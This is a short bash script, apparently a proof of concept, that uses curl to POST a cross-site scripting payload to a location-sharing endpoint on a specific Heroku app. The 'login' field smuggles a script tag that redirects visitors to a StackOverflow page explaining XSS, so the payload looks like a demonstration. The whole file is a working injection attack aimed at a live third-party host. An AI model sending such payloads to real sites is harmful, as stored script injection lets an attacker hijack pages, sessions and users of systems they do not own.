#!/bin/bash
curl -d "login= <script>window.location.replace('https://stackoverflow.com/questions/15755323/what-is-cross-site-scripting')</script>&lat=42&lng=5"  https://hidden-taiga-87881.herokuapp.com/sendLocation


